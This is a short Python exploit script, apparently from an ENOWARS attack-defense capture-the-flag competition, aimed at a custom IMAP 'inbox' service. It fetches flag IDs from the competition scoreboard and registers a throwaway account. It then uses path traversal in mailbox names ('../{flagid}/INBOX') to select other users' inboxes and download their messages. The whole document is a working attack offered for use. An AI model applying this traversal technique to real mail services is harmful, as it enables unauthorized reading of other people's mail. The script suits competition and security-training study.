#!/usr/bin/env python3

from email.message import EmailMessage
import imaplib 
from secrets import token_hex
import requests
import sys
from pwn import *

if len(sys.argv) > 1:
    ip = sys.argv[1]
else:
    ip = "10.1.1.1"

username = token_hex(12)
password = token_hex(12)

imaplib.Commands["REGISTER"] = ("NONAUTH", "AUTH")

class Client(imaplib.IMAP4):
    def register(self, username: str, password: str):
        return self._simple_command("REGISTER", username, password)

def get_service():
    r = requests.get("https://10.enowars.com/scoreboard/attack.json")
    j = r.json()
    return j["availableTeams"], j["services"]["inbox"]

teams, service = get_service()

if ip in teams:
    data = service[ip]
    for tick in data:
        flagid = data[tick]['1'][0]
        client = Client(ip, 1234)

        client.register(username, password)
        client.login(username, password)

        a = client.subscribe(f"../{flagid}/INBOX")
        a = client.select(f"../{flagid}/INBOX")
        try:
            flag = client.fetch("1:*", "(BODY.PEEK[])")
        except ValueError:
            ...
        print(flag, flush=True)
